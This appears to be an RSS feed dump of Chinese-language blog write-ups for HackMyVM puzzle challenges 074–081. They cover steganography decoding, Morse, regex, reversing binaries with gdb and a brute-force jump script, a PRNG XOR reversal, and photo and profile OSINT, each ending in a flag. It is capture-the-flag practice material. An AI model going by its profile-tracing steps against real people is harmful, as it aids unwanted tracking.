000002c0  09 0a 20 20 20 20 20 09  20 09 09 09 09 09 0a 09  |..     . .......|
000002d0  0a 20 20 20 20 20 09 20  20 20 20 20 09 0a 09 0a  |.     .     ....|
000002e0  20 20 20 20 20 09 20 09  20 20 09 20 0a 09 0a 20  |     . .  . ... |
000002f0  20 20 20 20 20 09 09 20  20 20 20 0a 09 0a 20 20  |     ..    ...  |
00000300  20 20 20 09 20 09 20 09  20 09 0a 09 0a 20 20 20  |   . . . ....   |
00000310  20 20 09 20 20 09 09 09  20 0a 09 0a 20 20 20 20  |  .  ... ...    |
00000320  20 09 20 20 20 09 20 20  0a 09 0a 20 20 20 20 20  | .   .  ...     |
00000330  09 20 09 09 09 09 09 0a  09 0a 20 20 20 20 20 09  |. ........     .|
00000340  20 20 09 20 20 20 0a 09  0a 20 20 20 20 20 20 09  |  .   ...      .|
00000350  09 20 20 09 09 0a 09 0a  20 20 20 20 20 09 20 09  |.  .....     . .|
00000360  20 20 09 20 0a 09 0a 20  20 20 20 20 20 09 09 20  |  . ...      .. |
00000370  20 09 09 0a 09 0a 20 20  20 20 20 20 09 09 09 20  | .....      ... |
00000380  09 20 0a 09 0a 20 20 20  20 20 20 09 20 09 20 20  |. ...      . .  |
00000390  09 0a 09 0a 20 20                                 |....  |
00000396
```

ÁúãÁùÄÊúâÁÇπËßÑÂæã
```bash
‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat message.txt | tr ' \t' '01'  
01000100
00110000
01001110
01010100
01011111
01010111
00110000
01010010
01010010
01011001
01011111
01000111
01010101
01011001
00110101
01011111



1000
00011
001101
1000
00001
1010
101
001101
000
11111
11111
10
101011
001101



0001000111
1
000000110000
1
000001010100
1
000001010100
1
000000110100
1
000001011111
1
000001010100
1
000000110100
1
000001001011
1
000000110011
1
000001011111
1
000001000011
1
000000110100
1
000001010010
1
000000110011
1
000001011111
1
000000110000
1
000001000110
1
000001011111
1
000001010011
1
000000110000
1
000001001101
1
000001000101
1
000001011111
1
000001000010
1
000001010101
1
000000110101
1
000000110001
1
000001001110
1
000000110011
1
000000110101
1
000000110101
1
000001011111
1
000001000001
1
000001010010
1
000000110000
1
000001010101
1
000001001110
1
000001000100
1
000001011111
1
000001001000
1
000000110011
1
000001010010
1
000000110011
1
000000111010
1
000000101001
1
00
```

https://gchq.github.io/CyberChef/

![image-20250729214536810](http://7r1UMPHK.github.io/image/20250729214537116.webp)

Á¨¨‰∏ÄÊÆµ

```bash
D0NT_W0RRY_GUY5_
```

ÁÑ∂Âêé‰∏≠Èó¥ËøôÊÆµÁ∫ØËÑëÊ¥ûÔºåÊòØËé´ÊñØÂØÜÁ†Å

```bash
‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat mosi|sed 's/1/-/g; s/0/./g'                                                                                                       
-...
...--
..--.-
-...
....-
-.-.
-.-
..--.-
...
-----
-----
-.
-.-.--
..--.-
```

https://morsecodetranslator.com/

```bash
B3_B4CK_S00N!_
```

ÂêéÈù¢ÁöÑÊâíÊãâ‰∫ÜÂçäÂ§©ÔºåÁªìÊûúÂèëÁé∞ÊòØËΩ¨Êç¢ÁöÑÈóÆÈ¢ò

```bash
‚îå‚îÄ‚îÄ(pythonvenv)‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ tail -n +35 message.txt | tr '$ \t' '001' | grep -v '^1$\|^$' | sed 's/^0000//' | sed 's/.*\(.\{8\}\)$/\1/'
01000111
00110000
01010100
01010100
00110100
01011111
01010100
00110100
01001011
00110011
01011111
01000011
00110100
01010010
00110011
01011111
00110000
01000110
01011111
01010011
00110000
01001101
01000101
01011111
01000010
01010101
00110101
00110001
01001110
00110011
00110101
00110101
01011111
01000001
01010010
00110000
01010101
01001110
01000100
01011111
01001000
00110011
01010010
00110011
00111010
00101001
00
```

![image-20250729222525237](http://7r1UMPHK.github.io/image/20250729222525532.webp)

```bash
G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)
```

ÊãºÊé•

```bash
D0NT_W0RRY_GUY5_B3_B4CK_S00N!_G0TT4_T4K3_C4R3_0F_S0ME_BU51N355_AR0UND_H3R3:)
```

‰∏çÁî®Âä†HMVÁõ¥Êé•Êèê‰∫§sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20081.html</guid><pubDate>Wed, 06 Aug 2025 00:38:41 +0000</pubDate></item><item><title>Challenge 080</title><link>https://7r1UMPHK.github.io/post/Challenge%20080.html</link><description>Ëøô‰∏§Â§©ÈÖçIEÁöÑXÂõ≠Âå∫ÈÖçÁöÑÊÉ≥Èº†ÔºågithubËøòÊ≤°ÊÅ¢Â§çÔºåÊâì‰∏™challengeÂÜ∑Èùô‰∏Ä‰∏ã

![image-20250729212441389](http://7r1UMPHK.github.io/image/20250729212450348.webp)

```
(?![a-z])([VHM]{3})(?!\w)(?P&lt;Q&gt;[\{])R(?![\d])(e)g\3x(\_{1})4\4th\3\4(W)in(?P&lt;H&gt;\x7d)$
```

ÁúãÁùÄÂÉèÊ≠£Âàô

```
HMV{Regex_4_the_Win}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20080.html</guid><pubDate>Wed, 06 Aug 2025 00:37:57 +0000</pubDate></item><item><title>Challenge 079</title><link>https://7r1UMPHK.github.io/post/Challenge%20079.html</link><description>![image-20250728104622420](http://7r1UMPHK.github.io/image/20250728104641252.webp)

![image-20250728104649253](http://7r1UMPHK.github.io/image/20250728104649363.webp)

ÂèçÁºñËØë

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  funkcja1(argc, argv, envp);
  return 0;
}

int funkcja1()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+30h] [rbp-10h]

  v2[0] = 0xC5E4E0C3F9E0D0D4LL;
  v2[1] = 0xE09AD8F7E4C0E1D3LL;
  v3 = -1802251312;
  policz_to(s, v2, string72);
  return puts(s);
}

__int64 __fastcall policz_to(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 result; // rax
  int i; // [rsp+24h] [rbp-4h]

  for ( i = 0; i &lt;= 19; ++i )
    *(_BYTE *)(i + a1) = ~(*(_BYTE *)(i + a3) ^ *(_BYTE *)(i + a2));
  result = a1 + 20;
  *(_BYTE *)(a1 + 20) = 0;
  return result;
}

.data:0000000000407910 string72        db 'dIZQmPVTUttkFJ0SlZ81',0
.data:0000000000407910                                         ; DATA XREF: funkcja1+37‚Üëo
```

‰ªñËøô‰∏™Á®ãÂ∫èÁõ¥Êé•ÊâßË°åÊòØ‰ºöËæìÂá∫‰∏úË•øÁöÑ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ./hmv-011       
OfEWQOMnyjKpNmULCvTZ
```

‰ΩÜÈóÆÈ¢òÊòØËøô‰∏™‰∏çÊòØflagÔºåËÄå‰∏îÊàëÊ†πÊçÆ‰ªñÁöÑtipÔºåÂ∞ùËØïrev‰πü‰∏çË°å

ÁÑ∂ÂêéÊàëÂéª‰ªîÁªÜËßÇÂØü‰∫Ü‰∏Ä‰∏ãidaÔºåÊàëÂèëÁé∞‰ªñËøòÊúâÂæàÂ§öfunkcjaÁöÑÂáΩÊï∞Ôºå1-100

```c
int funkcja2()
{
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  __int64 v2[2]; // [rsp+20h] [rbp-20h] BYREF
  int v3; // [rsp+30h] [rbp-10h]

  v2[0] = 0xD9CD87CFF6E48DECLL;
  v2[1] = 0xEFC3BFD3FFEE83FELL;
  v3 = -1044847680;
  policz_to(s, v2, string9);
  return puts(s);
}
```

ÈÇ£Áõ¥Êé•ÂÜô‰∏™ËÑöÊú¨ÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ objdump -d ./hmv-011 | grep -A 10 '&lt;main&gt;:'
0000000000403336 &lt;main&gt;:
  403336:       f3 0f 1e fa             endbr64
  40333a:       55                      push   %rbp
  40333b:       48 89 e5                mov    %rsp,%rbp
  40333e:       b8 00 00 00 00          mov    $0x0,%eax
  403343:       e8 56 de ff ff          call   40119e &lt;funkcja1&gt;
  403348:       b8 00 00 00 00          mov    $0x0,%eax
  40334d:       5d                      pop    %rbp
  40334e:       c3                      ret

Disassembly of section .fini:
```

ÁºñÂÜôËÑöÊú¨

```bash
#!/bin/bash

BIN='./hmv-011'
ADDR='*0x403343'

for i in $(seq 1 100); do
    FN='funkcja${i}'
    echo -n '[*] test: ${FN}'

    OUT=$(gdb -q -batch \
        -ex 'b ${ADDR}' \
        -ex 'r' \
        -ex 'jump ${FN}' \
        -ex 'c' \
        --args ${BIN} 2&gt;/dev/null)

    if echo '$OUT' | grep -q 'HMV{'; then
        echo -e '\n\n[+] Found: ${FN}'
        echo '[!] FLAG: $(echo '$OUT' | grep -o 'HMV{[^}]*}')'
        exit 0
    else
        echo -ne '\r'
    fi
done

echo '[-] Failed.'
```

ÊâßË°å

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ bash a.sh
[*] test: funkcja82

[+] Found: funkcja82
[!] FLAG: HMV{Is11task_hard??}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20079.html</guid><pubDate>Wed, 06 Aug 2025 00:37:40 +0000</pubDate></item><item><title>Challenge 078</title><link>https://7r1UMPHK.github.io/post/Challenge%20078.html</link><description>ËøôÈ¢òÊàëËØ¥ÊÄé‰πàËøô‰πàÁúºÁÜüÔºåËøô‰∏çÊàëËøõÁæ§Ëß£ÁöÑÁ¨¨‰∏ÄÈ¢òÂêó
![image-20250727223622608](http://7r1UMPHK.github.io/image/20250727223622837.webp)

ÊòØÊúâ‰∏Ä‰∏™Áî®Êà∑Âè´Alter

https://hackmyvm.eu/profile/?user=Alter

![img](https://hackmyvm.eu/img/u/Alter.jpg)

‰ªñÂ§¥ÂÉèÊúâÈóÆÈ¢òÔºåÊòØdiscordÁöÑ‰∏Ä‰∏™Áî®Êà∑

https://discord.id/

![](http://7r1UMPHK.github.io/image/20250806083618411.webp)

ÂéªhmvÁöÑdiscordÊâíÊãâ‰∏Ä‰∏ã‰ªñ
![image-20250727224618346](http://7r1UMPHK.github.io/image/20250727224618491.webp)

ÁÑ∂ÂêéËøô‰∏™Âì•‰ª¨Âú®linkedinÔºåÊúâ‰∏™Âè∑

https://www.linkedin.com/in/alter-ego-003280321/

```
HMV{4lt3r_3g0s_d0nt_h1d3}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20078.html</guid><pubDate>Wed, 06 Aug 2025 00:36:42 +0000</pubDate></item><item><title>Challenge 077</title><link>https://7r1UMPHK.github.io/post/Challenge%20077.html</link><description>![image-20250727172730845](http://7r1UMPHK.github.io/image/20250727172731096.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 077.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 4255250 bytes (4156 KiB)

Extracting archive: 077.zip
--
Path = 077.zip
Type = zip
Physical Size = 4255250

Everything is Ok

Size:       4283925
Compressed: 4255250
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 8360
drwxr-xr-x 1 kali kali    4096  7Êúà27Êó• 05:28 .
drwxr-xr-x 1 kali kali   16384  7Êúà26Êó• 10:07 ..
-rwxr-xr-x 1 kali kali 4255250  7Êúà27Êó• 05:27 077.zip
-rwxr-xr-x 1 kali kali 4283925 2024Âπ¥ 7Êúà 5Êó• Building.jpg

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ exiftool Building.jpg 
ExifTool Version Number         : 13.25
File Name                       : Building.jpg
Directory                       : .
File Size                       : 4.3 MB
File Modification Date/Time     : 2024:07:05 15:37:28-04:00
File Access Date/Time           : 2025:07:27 05:28:10-04:00
File Inode Change Date/Time     : 2024:07:05 15:37:28-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
Orientation                     : Horizontal (normal)
Y Resolution                    : 72
X Resolution                    : 72
Software                        : MediaTek Camera Application
Image Description               : 
Y Cb Cr Positioning             : Co-sited
Exif Version                    : 0220
Exposure Compensation           : 0
Exposure Program                : Not Defined
Color Space                     : sRGB
Max Aperture Value              : 1.0
Exif Image Height               : 4096
Brightness Value                : 9.6
Flashpix Version                : 0100
Interoperability Index          : R98 - DCF basic file (sRGB)
Recommended Exposure Index      : 0
Exposure Mode                   : Auto
Exif Image Width                : 3072
Components Configuration        : Y, Cb, Cr, -
Digital Zoom Ratio              : 1
Metering Mode                   : Center-weighted average
Sensitivity Type                : Unknown
Scene Capture Type              : Standard
Light Source                    : Other
Resolution Unit                 : inches
Compression                     : JPEG (old-style)
Thumbnail Offset                : 616
Thumbnail Length                : 27648
Image Width                     : 3072
Image Height                    : 4096
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 3072x4096
Megapixels                      : 12.6
Thumbnail Image                 : (Binary data 27648 bytes, use -b option to extract)
```

‚Äã	EXIFÊï∞ÊçÆÊ≤°ÊúâÂåÖÂê´Ë°óÈÅìÂêçÁß∞ÁöÑÂ≠óÊÆµ

![Building](http://7r1UMPHK.github.io/image/20250727173525425.webp)

google‰∏Ä‰∏ã

https://jp.123rf.com/photo_24186080_%E3%83%95%E3%83%A9%E3%83%B3%E3%82%B9-%E3%83%91%E3%83%AA%E3%81%AE%E5%85%B8%E5%9E%8B%E7%9A%84%E3%81%AA%E3%82%A2%E3%83%91%E3%83%BC%E3%83%88%E3%81%AE%E5%BB%BA%E7%89%A9.html

https://www.flickr.com/photos/62139793@N03/5653696549/in/photostream/

ËíôÈ©¨Áâπ Âú£ÂøÉÂ§ßÊïôÂ†Ç

ÊâíÊãâ‰∫ÜÂæà‰πÖÔºåÊâæ‰∏çÂà∞ÔºåÂéªdiscordÂèëÁé∞ÁªøËÄÅÂì•Ëß£Ëøá‰∫Ü

https://www.google.pl/maps/@48.887831,2.341695,3a,20.4y,17.44h,85.63t/data=!3m7!1e1!3m5!1sf_2fd7iAG1y1DnDGNPVqkQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D4.371506987724828%26panoid%3Df_2fd7iAG1y1DnDGNPVqkQ%26yaw%3D17.439427502100934!7i16384!8i8192?coh=205410&amp;entry=ttu

ÊäÑ‰∏Ä‰∏ã

````
HMV{Rue_Saint-Vincent}
````

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20077.html</guid><pubDate>Wed, 06 Aug 2025 00:34:42 +0000</pubDate></item><item><title>Challenge 076</title><link>https://7r1UMPHK.github.io/post/Challenge%20076.html</link><description>![image-20250727171057275](http://7r1UMPHK.github.io/image/20250727171101631.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ cd tmp      
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 076.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 415777 bytes (407 KiB)

Extracting archive: 076.zip
--
Path = 076.zip
Type = zip
Physical Size = 415777

Everything is Ok

Files: 2
Size:       1056496
Compressed: 415777
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al               
ÊÄªËÆ° 1459
drwxr-xr-x 1 kali kali    4096  7Êúà27Êó• 05:11 .
drwxr-xr-x 1 kali kali   16384  7Êúà26Êó• 10:07 ..
-rwxr-xr-x 1 kali kali  415777  7Êúà27Êó• 05:11 076.zip
-rwxr-xr-x 1 kali kali   16392 2024Âπ¥ 7Êúà 1Êó• hmv010
-rwxr-xr-x 1 kali kali 1040104 2024Âπ¥ 7Êúà 1Êó• hmv010-static
```

ËøêË°å

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ./hmv010-static
Enter the flag : hello
Sorry, ùì£ùìªùîÇ ùì±ùì™ùìªùì≠ùìÆùìª !
```

ÂèçÁºñËØë

```bash
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  generate_random_numbers(argc, argv, envp);
  printf('Enter the flag : ');
  __isoc99_scanf('%32s', v4);
  if ( (unsigned int)xor_and_check(v4) )
    puts('È¶ÉÊÜ¶ BravoÈ¶ÉÊÜ¶');
  else
    puts('Sorry, È•æÊëöÈ•æÊë∂È•æÊî§ È•æÊë´È•æÊë¢È•æÊë∂È•æÊë•È•æÊë¶È•æÊë∂ !');
  return 0;
}

void generate_random_numbers()
{
  int i; // [rsp+Ch] [rbp-4h]

  srand(0);
  for ( i = 0; i &lt;= 31; ++i )
    numbers[i] = rand() % 256;
}

__int64 __fastcall xor_and_check(__int64 a1)
{
  int i; // [rsp+14h] [rbp-4h]

  for ( i = 0; i &lt;= 31; ++i )
  {
    if ( (FLAG[i] ^ numbers[i]) != *(unsigned __int8 *)(i + a1) )
      return 0LL;
  }
  return 1LL;
}
```

gdb

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ gdb ./hmv010-static 
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type 'show copying' and 'show warranty' for details.
This GDB was configured as 'x86_64-linux-gnu'.
Type 'show configuration' for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type 'help'.
Type 'apropos word' to search for commands related to 'word'...
Reading symbols from ./hmv010-static...
(No debugging symbols found in ./hmv010-static)
(gdb) break xor_and_check
Breakpoint 1 at 0x401bdb
(gdb) run
Starting program: /mnt/hgfs/gx/x/tmp/hmv010-static 
Enter the flag : aaaaaa

Breakpoint 1, 0x0000000000401bdb in xor_and_check ()
(gdb) info variables FLAG
All variables matching regular expression 'FLAG':

Non-debugging symbols:
0x00000000004b7020  FLAG
(gdb) info variables numbers
All variables matching regular expression 'numbers':

Non-debugging symbols:
0x00000000004e83c0  numbers
(gdb) x/32bx 0x4b7020
0x4b7020 &lt;FLAG&gt;:        0x2f    0x00    0x00    0x00    0x8b    0x00    0x00    0x00
0x4b7028 &lt;FLAG+8&gt;:      0x3f    0x00    0x00    0x00    0x08    0x00    0x00    0x00
0x4b7030 &lt;FLAG+16&gt;:     0x01    0x00    0x00    0x00    0x8c    0x00    0x00    0x00
0x4b7038 &lt;FLAG+24&gt;:     0x2f    0x00    0x00    0x00    0x99    0x00    0x00    0x00
(gdb) x/32dw 0x4e83c0
0x4e83c0 &lt;numbers&gt;:     103     198     105     115
0x4e83d0 &lt;numbers+16&gt;:  81      255     74      236
0x4e83e0 &lt;numbers+32&gt;:  41      205     186     171
0x4e83f0 &lt;numbers+48&gt;:  242     251     227     70
0x4e8400 &lt;numbers+64&gt;:  124     194     84      248
0x4e8410 &lt;numbers+80&gt;:  27      232     231     141
0x4e8420 &lt;numbers+96&gt;:  118     90      46      99
0x4e8430 &lt;numbers+112&gt;: 51      159     201     154
(gdb) x/32dw 0x4b7020
0x4b7020 &lt;FLAG&gt;:        47      139     63      8
0x4b7030 &lt;FLAG+16&gt;:     1       140     47      153
0x4b7040 &lt;FLAG+32&gt;:     77      162     229     249
0x4b7050 &lt;FLAG+48&gt;:     147     149     167     118
0x4b7060 &lt;FLAG+64&gt;:     17      157     26      141
0x4b7070 &lt;FLAG+80&gt;:     118     138     130     255
0x4b7080 &lt;FLAG+96&gt;:     5       5       103     13
0x4b7090 &lt;FLAG+112&gt;:    108     192     138     231
```

ÂÜôflagËÆ°ÁÆó

```bash
#a.py
import random

def calc_flag():
    random.seed(0)
    
    flag_ints = [47, 139, 63, 8, 1, 140, 47, 153, 77, 162, 229, 249, 147, 149, 167, 118, 17, 157, 26, 141, 118, 138, 130, 255, 5, 5, 103, 13, 108, 192, 138, 231]
    numbers = [103, 198, 105, 115, 81, 255, 74, 236, 41, 205, 186, 171, 242, 251, 227, 70, 124, 194, 84, 248, 27, 232, 231, 141, 118, 90, 46, 99, 51, 159, 201, 154]
    
    flag = ''.join(chr(flag_ints[i] ^ numbers[i]) for i in range(32))
    print(flag)

calc_flag()
```

ËøêË°å

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 a.py             
HMV{Pseudo_RanD0m_Numbers_In__C}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20076.html</guid><pubDate>Wed, 06 Aug 2025 00:33:33 +0000</pubDate></item><item><title>Challenge 075</title><link>https://7r1UMPHK.github.io/post/Challenge%20075.html</link><description>![image-20250726094546654](http://7r1UMPHK.github.io/image/20250726094546906.webp)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 075.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1660377 bytes (1622 KiB)

Extracting archive: 075.zip
--
Path = 075.zip
Type = zip
Physical Size = 1660377

Everything is Ok

Size:       1678207
Compressed: 1660377
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 3281
drwxr-xr-x 1 kali kali    4096  7Êúà25Êó• 21:46 .
drwxr-xr-x 1 kali kali   16384  7Êúà25Êó• 08:07 ..
-rwxr-xr-x 1 kali kali 1660377  7Êúà25Êó• 21:45 075.zip
-rwxr-xr-x 1 kali kali 1678207 2024Âπ¥ 5Êúà26Êó• 75.jpg

‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ exiftool 75.jpg                                        
ExifTool Version Number         : 13.25
File Name                       : 75.jpg
Directory                       : .
File Size                       : 1678 kB
File Modification Date/Time     : 2024:05:26 06:25:51-04:00
File Access Date/Time           : 2025:07:25 21:46:51-04:00
File Inode Change Date/Time     : 2024:05:26 06:25:51-04:00
File Permissions                : -rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 72
Y Resolution                    : 72
Image Width                     : 2645
Image Height                    : 1276
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 2645x1276
Megapixels                      : 3.4
```

![75](http://7r1UMPHK.github.io/image/20250726094651605.webp)

googleÂèçÂêëÊ°Ü‰∏Ä‰∏ãÂ∞±Âá∫Êù•‰∫Ü

ÊâíÊãâ‰∏Ä‰∏ã
https://www.alamy.com/stock-photo-view-on-narrow-cobbled-street-among-traditional-parisian-buildings-50665105.html

ËøôÈáåÁöÑÊØîËæÉÊ∏ÖÊô∞
https://www.flickr.com/photos/17770552@N02/25410475164/

ËøôÈáåÊòæÁ§∫‰∫ÜÂ∫óÈì∫Âêç‰ΩÜÊòØ‰∏çÊòØÂæàÊ∏ÖÊô∞

![image-20250726100801703](http://7r1UMPHK.github.io/image/20250726100802211.webp)

AIÁúünbÔºåÂéªgoogle map‰∏ÄÁúãÂ∞±ÁúãÂà∞‰∫Ü

![image-20250726100844052](http://7r1UMPHK.github.io/image/20250726100844945.webp)

```
HMV{The_Tea_Caddy}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20075.html</guid><pubDate>Wed, 06 Aug 2025 00:32:57 +0000</pubDate></item><item><title>Challenge 074</title><link>https://7r1UMPHK.github.io/post/Challenge%20074.html</link><description>Ëøô‰∏§Â§©githubË¢´Ê†áËÆ∞‰∫ÜÔºåÊâÄ‰ª•Áé∞Âú®ÂÜôÁöÑwpÔºåÂçöÂÆ¢ÂêéÈù¢ÊâçÊÖ¢ÊÖ¢Âèë

Ëøô‰∏§Â§©Â§ç‰π†Âø´ÁñØ‰∫ÜÔºåÊâìÊâìchallenges

![image-20250726092459966](http://7r1UMPHK.github.io/image/20250726092508923.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ 7z x 074.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10720923 bytes (11 MiB)

Extracting archive: 074.zip
--
Path = 074.zip
Type = zip
Physical Size = 10720923

Everything is Ok

Files: 2
Size:       10729161
Compressed: 10720923
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ls -al
ÊÄªËÆ° 20969
drwxr-xr-x 1 kali kali     4096  7Êúà25Êó• 21:26 .
drwxr-xr-x 1 kali kali    16384  7Êúà25Êó• 08:07 ..
-rwxr-xr-x 1 kali kali 10729024 2024Âπ¥ 5Êúà26Êó• 074.png
-rwxr-xr-x 1 kali kali      137 2024Âπ¥ 5Êúà28Êó• 074.txt
-rwxr-xr-x 1 kali kali 10720923  7Êúà25Êó• 21:25 074.zip
                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 074.txt 
0000000001100100011011110101111101111001011011110111010101011111011011000110100101101011011001010101111101111000011011110111001000111111
```

ÊòØhexÔºåËß£‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ cat 074.txt | perl -lpe '$_=pack'B*',$_'
do_you_like_xor?
```

XORÂºÇÊàñÔºåÊÑèÊÄùÂ∞±ÊòØËøòÊúâ‰∏úË•ø

![074](http://7r1UMPHK.github.io/image/20250726093019615.webp)

ÂñµÂñµÔºåÂìàÂìàÂìà

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ binwalk -e 074.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
60            0x3C            Zlib compressed data, default compression

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ binwalk 074.png    

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 2882 x 3840, 8-bit/color RGB, non-interlaced
60            0x3C            Zlib compressed data, default compression
3858618       0x3AE0BA        JBOOT SCH2 kernel header, compression type: gzip, Entry Point: 0xFE3E8414, image size: 936827483 bytes, data CRC: 0xAC684B75, Data Address: 0xD1EDDC73, rootfs offset: 0xC8D8C018, rootfs size: 294417102 bytes, rootfs CRC: 0xA1288981, header CRC: 0x44230814, header size: 36867 bytes, cmd line length: 22886 bytes
4911357       0x4AF0FD        JBOOT STAG header, image id: 0, timestamp 0x883BEF22, image size: 271372934 bytes, image JBOOT checksum: 0xB20, header JBOOT checksum: 0x20EB

                                                                                                                                                                                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ zsteg 074.png      
imagedata           .. text: '\n\n\n\t\t\t\n\n'
b1,rgb,msb,xy       .. text: 'DJ$%I\'II$II'
b2,b,msb,xy         .. text: 'VZj]-vOF'
b2,rgb,lsb,xy       .. file: OpenPGP Secret Key
b3,b,msb,xy         .. text: 'Mqpn|Tq\rz'
b3,bgr,lsb,xy       .. text: 'Ho$[@2A 4'
b4,r,lsb,xy         .. text: 'St{aUFdb'
b4,b,lsb,xy         .. text: 'DDUDUTDDEUTDUUTDTDUDDDDDDDUUfUUDDEUUDUV'
b4,rgb,lsb,xy       .. text: 'UCCxtTwk'
